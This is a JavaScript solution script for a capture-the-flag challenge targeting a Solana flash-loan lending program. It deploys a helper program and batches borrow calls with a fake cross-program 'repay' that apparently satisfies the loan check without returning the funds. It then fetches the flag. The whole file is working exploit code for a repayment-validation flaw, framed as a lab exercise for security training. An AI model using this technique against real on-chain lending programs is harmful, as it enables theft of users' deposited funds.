import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { sleep, parseAccounts, sendInstructions } from "./util.js";
import { Keypair, PublicKey, SYSVAR_INSTRUCTIONS_PUBKEY, Transaction } from "@solana/web3.js";
import { ACCOUNT_SIZE, createInitializeAccountInstruction, getAccount, getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge3.json"));
// Originally wrote the cpiProgram in anchor but couldnt workaround
// DeclareProgramIdMismatch issue so rewrote it without anchor, but kept the IDL. 
const cpiIdl = JSON.parse(fs.readFileSync("../idl/cpic3.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE)); // api.PLAYERFILE
const player = accountFile.player;
const accounts = accountFile.challengeThree;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
  // console.log(player.publicKey.toString());
  //const cpiProgramId = new PublicKey("74LSkYxGdLopZjnEQcsaGHAa32Rtbu4jwn29YPYwb2XG");
  // const cpiProgramId = new PublicKey("3VSExwrxHVZ9FEQWUde5jwLbSw1Mtxk2J1ngHfjDsdvi"); 
  const cpiProgramId = await api.deployProgram(baseUrl, player.publicKey, fs.readFileSync("../chain/target/deploy/cpic3.so"));
  // console.log(cpiProgramId.toString());

  const cpiProgram = new anchor.Program(cpiIdl, cpiProgramId, "fake truthy vlaue");

  const {
    state,
    atomcoinMint,
    pool,
    poolAccount,
  } = accounts;

  const playerAtomAta = await getAssociatedTokenAddress(
    atomcoinMint,
    player.publicKey,
  );

  const tx = new Transaction();
  const amounts = [50, 25, 12, 6, 3, 2, 1];
  for (const amount of amounts) {
    tx.add(
      await program.methods.borrow(new BN(amount))
        .accounts({
          player: player.publicKey,
          state,
          pool,
          poolAccount,
          depositorAccount: playerAtomAta,
          instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
    tx.add(
      // the program actually doesnt care about instruction_data at all
      // but this was leftover from the IDL
      await cpiProgram.methods.cpiRepay(new BN(0))
        .accounts({
          player: player.publicKey,
          user: player.publicKey,
          state,
          pool,
          poolAccount,
          depositorAccount: playerAtomAta,
          tokenProgram: TOKEN_PROGRAM_ID,
          challenge3Program: program.programId,
        })
        .instruction()
    )
    tx.add(
      await program.methods.borrow(new BN(amount))
        .accounts({
          player: player.publicKey,
          state,
          pool,
          poolAccount,
          depositorAccount: playerAtomAta,
          instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
    tx.add(
      await program.methods.repay(new BN(amount))
        .accounts({
          player: player.publicKey,
          user: player.publicKey,
          state,
          pool,
          poolAccount,
          depositorAccount: playerAtomAta,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
    );
  }
  await conn.sendTransaction(tx, [player]);
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 3);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
